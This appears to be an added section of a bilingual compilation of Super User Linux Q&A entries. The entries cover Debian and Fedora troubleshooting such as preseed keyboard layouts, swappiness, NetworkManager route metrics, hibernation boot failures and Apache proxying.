+#### 3102. When running makepkg -si I get multiple exists in filesystem messages and no packages get installed
+
+**问题描述 / Problem Description**:
+Tags: linux, fedora, minecraft, source-code, pacman | Score: 1 | Views: 103 | Answers: 1 | Created: 2025-06-06
+
+**解决方案 / Solution**:
+You're trying to install ArchLinux (the OS, base system) on top of your existing Fedora, and ArchLinux's pacman repository manager prevents you from rewriting the system files.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1904138/when-running-makepkg-si-i-get-multiple-exists-in-filesystem-messages-and-no-pac
+
+---
+
+#### 3103. How do I print IP address and SSH host keys finterprints before login prompt on linux?
+
+**问题描述 / Problem Description**:
+Tags: linux, debian, sshd | Score: 1 | Views: 95 | Answers: 1 | Created: 2025-05-30
+
+**解决方案 / Solution**:
+Add a script to the ExecStartPre= of getty@.service . (You might also want to set TTYReset=no , and make sure your /etc/issue doesn't have any "clear screen" codes.) Alternatively, add a script that generates /etc/issue to the ExecStartPre of the same service.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1903003/how-do-i-print-ip-address-and-ssh-host-keys-finterprints-before-login-prompt-on
+
+---
+
+#### 3104. No brightness control. Debian with KDE on iMac 2013
+
+**问题描述 / Problem Description**:
+Tags: linux, debian, graphics-card, nvidia-graphics-card, kde | Score: 1 | Views: 321 | Answers: 1 | Created: 2025-05-07
+
+**解决方案 / Solution**:
+Switch display manager from Wayland to x11 then use xrandr. While this is technically a solution to the problem, x11 is not fully compatible with KDE. I notice that several basic settings are not available such as custom shortcuts. Display brightness changes from xrandr persist when I switch back to Wayland, but do no persist after reboot. Here are the steps I took: Navigate to the login screen (Logged out of my session without shutdown) Switch from Wayland to X11 (in the lower left corner of the login screen it just said "Wayland" - I clicked it and chose the x11 option.) Use xrandr | grep " connected" to get display name. (The first "word" in the resulting line was DP-1, my display name.) Use xrandr --output DP-1 --brightness 0.7 to change brightness! (0.7 makes it a little bit dim. 1.2 makes it brighter. 1 is default.) xrandr does not work in Wayland
+
+**参考链接 / References**:
+- https://superuser.com/questions/1896499/no-brightness-control-debian-with-kde-on-imac-2013
+
+---
+
+#### 3105. Why is my Debian 12.5. preseed keyboard setting not working as expected?
+
+**问题描述 / Problem Description**:
+Tags: linux, debian, keyboard, keyboard-layout, preseed | Score: 1 | Views: 207 | Answers: 1 | Created: 2025-04-26
+
+**解决方案 / Solution**:
+I was having the same problem. There might be a bug in (at least) Debian 11/12/13. I compared a manual installation with an automated/preseeded installation using the same settings. The manual installation works as expected (correct non-default keyboard layout), the preseeded installation always has a us keyboard layout (to be more precise: it is unset). I also observed that the manual installation contains the packages console-setup , keyboard-configuration and all their dependencies, but they are missing on the preseeded installation. There is one very related difference between manual and automated installation ( docs ): During a normal install the questions about localization are asked first, so these values can only be preseeded via the initrd or kernel boot parameter methods. Auto mode ( Section B.2.3, "Auto mode" ) includes the setting of auto-install/enable=true (normally via the auto preseed alias). This delays the asking of the localisation questions, so that they can be preseeded by any method. The localechooser during manual installation seems to work differently than the postponed localization during automated installation. Check your /var/log/syslog during installation. You will probably see the following error at the beginning of the base-installer part: base-installer: cp: can't stat '/etc/default/keyboard': No such file or directory The absence of the file /etc/default/keyboard leads to console-setup and keyboard-configuration not beeing queued for installation. The healthy log of a manual installation will not have this error, but instead these lines right before base-installer begins: apt-install: Queueing package keyboard-configuration for later installation apt-install: Queueing package console-setup for later installation To fix the preseeded installation, you can deploy /etc/default/keyboard to the debian installer bootstrap environment (do not deploy it to /target/etc/... ). In your case, this might be the correct content: # KEYBOARD CONFIGURATION FILE # Consult the keyboard(5) manual page. XKBMODEL="pc105" XKBLAYOUT="de" XKBVARIANT="nodeadkeys" XKBOPTIONS="" BACKSPACE="guess" With that, the preseeded installation runs successfully, setting the keyboard layout as expected. And console-setup and keyboard-configuration get installed and configured like in the manual installation. PS: In your case, language and country are redundant. These localization settings will be sufficient, if you also provide the keyboard file: d-i debian-installer/locale string de_DE.UTF-8 d-i keyboard-configuration/xkb-keymap select de
+
+**参考链接 / References**:
+- https://superuser.com/questions/1894257/why-is-my-debian-12-5-preseed-keyboard-setting-not-working-as-expected
+
+---
+
+#### 3106. vm.swappiness in /etc/sysctl.conf stopped working after updating to debain trixie/sid
+
+**问题描述 / Problem Description**:
+Tags: debian, sysctl, swappiness | Score: 1 | Views: 1055 | Answers: 1 | Created: 2025-04-13
+
+**解决方案 / Solution**:
+I've fixed the problem via creating /etc/sysctl.d/90-swappiness.conf with the following content: vm.swappiness=10 After creating this file, running systemctl restart systemd-sysctl is needed to apply the change immediately (because sysctl -p does not read the files in /etc/sysctl.d ).
+
+**参考链接 / References**:
+- https://superuser.com/questions/1891879/vm-swappiness-in-etc-sysctl-conf-stopped-working-after-updating-to-debain-trixi
+
+---
+
+#### 3107. How to add Apache Headers X-Served-By in Linux Debian 12?
+
+**问题描述 / Problem Description**:
+Tags: debian, apache-http-server, headers | Score: 1 | Views: 145 | Answers: 1 | Created: 2025-04-08
+
+**解决方案 / Solution**:
+According to this answer you should set in Apache config: UseCanonicalName On This will populate the server name to the variable. If you add HOSTNAME which is not "real" environment variable you should add in start script of apache export HOSTNAME to populate it and make it available for apache daemon
+
+**参考链接 / References**:
+- https://superuser.com/questions/1890855/how-to-add-apache-headers-x-served-by-in-linux-debian-12
+
+---
+
+#### 3108. What's special about the ffprobe command redirection?
+
+**问题描述 / Problem Description**:
+Tags: debian, redirection, ffprobe | Score: 1 | Views: 587 | Answers: 2 | Created: 2025-03-30
+
+**解决方案 / Solution**:
+Or is it up to the programmer to choose the way a redirection behaves No. The shell chooses how redirection behaves. It's pretty much standard behavior across all shells - standard output is what's redirected with > by default, as the 1st/main stream. It's up to programmers to choose where to output specific data rather. E.g. fprintf(stderr, "something"); in C, which ffmpeg is programmed in, to instead output to standard error. What could explain why the usual method of redirecting output to a file doesn't work for Because ffmpeg devs' design choice was to output most of the content into standard error stream in ffprobe. Here you can find a report about it and short explantation as to why: ffprobe's output is meant for parsing. We offer guarantee of stability about its format and contents. The stderr dump is cosmetic and meant for humans, we do not offer guarantee of stability. Which is a bit of misusage of the streams, as the more specific one has nothing to do with errors.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1889175/whats-special-about-the-ffprobe-command-redirection
+
+---
+
+#### 3109. Permanently change the default route to ethernet Fedora 41
+
+**问题描述 / Problem Description**:
+Tags: networking, wireless-networking, routing, fedora, wired | Score: 1 | Views: 450 | Answers: 1 | Created: 2025-03-20
+
+**解决方案 / Solution**:
+Default route is set to an aliased DNS name, "_gateway", which resolves to two IPs, such as 192.168.9.1 and 10.10.0.1 which I guess are ok as they match the two networks the NICs would be on. It is not set to that. Route gateways are always IP addresses – it's only a matter of whether your route-listing program decides to resolve that address back into some hostname. (The regular Linux ip route command doesn't do so unless you explicitly ask for it, but older tools might do it by default.) Additionally, _gateway is not a DNS name. Linux often comes with an /etc/nsswitch.conf module which internally resolves this name to whichever default gateway happens to be currently defined. (So even if routes could have names as gateways, it wouldn't be possible to use "_gateway" there, because that particular name only comes from route gateways in the first place.) I don't know why the wired NIC isn't at a lower metric, but in any case, it's also not routing its own metric. Keep in mind that for ping -I <interface> to work, there still needs to be an actual route through that interface – the OS needs to know which gateway to use, otherwise it can only assume the destination is local – so you can only test this while you still have both default routes. When you have multiple default routes, you also cannot use the "Reverse path filtering" in strict mode, as it by design drops return packets that arrive from the "wrong" interface, so make sure to disable it via sysctl.d (or set to 'loose' mode, which is as useful as disabled): net.ipv4.conf.all.rp_filter = 0 But the wired NIC eno1 has an outlandishly high metric, That means NetworkManager's built-in "network connectivity check" failed to make an HTTP connection through it. Whenever the connection profile is brought up, as well as every X minutes, NM makes an HTTP request through every "default route" interface to contact some pre-configured URL – just like 'Microsoft NCSI' in Windows, and similar features on all mobile platforms. If the request fails, the interface gets an additional +20000 to its route metrics. $ nmcli net connec full $ NetworkManager --print-config [connectivity] uri=http://detectportal.firefox.com/ response=success If you're sure that the Ethernet interface is working fine, then either change the connectivity test URL to one that your network isn't blocking (like the 'msftconnecttest.com' one) via /etc/NetworkManager, or disable the feature outright through enabled=no in the same config file. Merely disabling it, however, will not actually make the interface work – it will only avoid the outlandishly high metric values.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1887566/permanently-change-the-default-route-to-ethernet-fedora-41
+
+---
+
+#### 3110. Cannot browse the internet in VMWare Player guest CentOS
+
+**问题描述 / Problem Description**:
+Tags: networking, dns, browser, centos, vmware | Score: 1 | Views: 338 | Answers: 2 | Created: 2025-03-10
+
+**解决方案 / Solution**:
+I have the same problem on a win11 with NAT on vmware fusion on my enterprise network. In my case, the enterprise firewall blocks the "dns over https" (DoH). When you are using the nat, the DNS serveur in the vm is vmware and vmware forwards the dns requests using DoH. I don't have figure out how to disable this behavior In the VM, you can manually set the enterprise DNS to bypass the VMWare DNS.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1885236/cannot-browse-the-internet-in-vmware-player-guest-centos
+
+---
+
+#### 3111. Fedora 41 does not boot after hibernation
+
+**问题描述 / Problem Description**:
+Tags: boot, fedora, hibernate, fedora-41 | Score: 1 | Views: 296 | Answers: 1 | Created: 2025-02-12
+
+**解决方案 / Solution**:
+I had this problem today and was able to fix it by doing some probably not recommended things. I'm a new Linux so really take what I have to say with all the salt. My set up: -I set up hibernation and had a swap partition made for it when I initially installed my Fedora Nobara KDE Plasma installation. -I set my computer to hibernate after 5 minutes of idle and when I closed the clam shell. I closed my clam shell to test it and upon reopening it and trying to reboot it got stuck on trying to load something related to UUID. I don't remember exactly. But I fixed it by going into a few files and removing a specific line from each. But to check if we had the same problem, before you choose which kernel to load on initial boot, press 'e' to see the grub2 boot commands it will load and if your problem is the same as mine, you should see a bit of text in the commands that reads resume=uuid=*string-of-chars-and-numbers* . This is where it will try to grab the pagefile from (I think) but mine was not there for some reason, so it just hung there indefinitely. Removing the entire resume command presumably stops it from trying to reload your last session and just boots like normal. If you manually delete only that part and it boots properly, then you have to go in and delete that text from a few files in your file manager (otherwise it will just replace it next time you boot). There's probably a much better way to do this but like I said I am a Linux newb. It will warn you that you need to be careful in this area while you are root user and you definitely should be. I made backup copies of each of these files and put them on my desktop until I was sure it worked. Not that that would have helped if my system was completely broken by the changes though anyway. The files you need to remove the text resume=uuid=*string-of-chars-and-numbers* from are: Each file in boot>loader>entries The file in boot>grub2>grub.cfg Hopefully this helps you! I thought my install was lost (again). Needless to say I won't be messing around with hibernation again for a while. Here is some info that helped me. Grub boot options: https://docs.fedoraproject.org/en-US/fedora/f36/install-guide/advanced/Boot_Options/ More specific post about options: https://discussion.fedoraproject.org/t/how-to-change-default-boot-option-in-grubenv/78743?replies_to_post_number=1 Hibernation swap removal: https://www.geeksforgeeks.org/how-to-permanently-disable-swap-in-linux/
+
+**参考链接 / References**:
+- https://superuser.com/questions/1878472/fedora-41-does-not-boot-after-hibernation
+
+---
+
+#### 3112. Old Netbook (Micromax Canvas Lapbook), Keyboard/TrackPad does not work in Linux
+
+**问题描述 / Problem Description**:
+Tags: linux, keyboard, fedora, arch-linux, kali-linux | Score: 1 | Views: 159 | Answers: 1 | Created: 2025-01-13
+
+**解决方案 / Solution**:
+I've got the exact same notebook (L1161 variant) and I had made a similar post here about a year ago. It has an Atom baytrail processor which is almost one of a kind (64bit architecture, 32bit UEFI). To add to the complexity, the company (Micromax) is now defunct and no drivers are available for this anymore on their website. As for Linux distros, it'd be a miracle to even get past the grub menu on this device! Your best bet of reviving this laptop is Windows-10 Home bootable disk of 32bit edition. I have a detailed post on my blog which can be helpful in you want to go this route.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1870331/old-netbook-micromax-canvas-lapbook-keyboard-trackpad-does-not-work-in-linux
+
+---
+
+#### 3113. How to route a subdomain to an IP
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, centos, routing, forwarding | Score: 1 | Views: 100 | Answers: 1 | Created: 2024-12-15
+
+**解决方案 / Solution**:
+I have an python app that needs IP to connect to the API Sorry to say this, but your python app needs to be fixed. DNS was invented many decades ago, and DNS support is literally built-in to most HTTP clients – so make your python app use DNS. Requiring a fixed IP address for an API server is not reasonable in 2024, both from an administrative perspective (the API server's owner is free to move servers around and reassign their IP addresses), and from a security perspective – how does your app handle TLS? does it just disable the certificate validation? Is there any way I can route a CentOS or Ubuntu server to the subdomain say xyz.app.com so my python app connects to the API. HAProxy should be capable of this, although I don't have a configuration example. If it didn't work for you, then Apache httpd (or Nginx) would also allow this – in Apache you should define ProxyPass for the default VirtualHost (and very similar proxy_pass in Nginx). <VirtualHost *:80> SSLProxyEngine On ProxyPass https://xyz.app.com </VirtualHost> (I don't think you can use ProxyPass from within .htaccess, but it's a small step from editing .htaccess to editing the same kind of configuration in /etc/apache2.)
+
+**参考链接 / References**:
+- https://superuser.com/questions/1865335/how-to-route-a-subdomain-to-an-ip
 
 ---
